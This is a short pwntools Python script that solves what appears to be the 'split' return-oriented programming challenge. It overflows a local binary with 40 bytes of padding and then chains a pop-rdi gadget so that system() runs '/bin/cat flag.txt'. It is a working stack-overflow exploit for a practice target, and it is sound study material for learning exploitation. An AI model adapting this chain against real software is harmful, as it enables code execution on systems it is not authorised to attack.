from pwn import *

context(os='linux',arch='amd64')

def main():

    b = ELF('split')
    r = ROP(b)

    # for this challenge, there's a gadget which calls system("/bin/ls")
    # additionally, there's a string "/bin/cat flag.txt"
    # to solve this challenge, we want to call system("/bin/cat flag.txt")
    # in order to do that, we want to get the address of the "cat" string
    # into rdi and then return to the gadget which calls system()
    p = process('./split')
    r.raw(r.find_gadget(['pop rdi','ret']).address)
    r.raw(b.symbols['usefulString'])
    r.call(b.symbols['usefulFunction']+9)

    p.recvuntil("> ")
    log.info("Sending exploit")
    p.sendline("A" * 40 + str(r))
    print(p.recvall())

if __name__ == "__main__":
    main()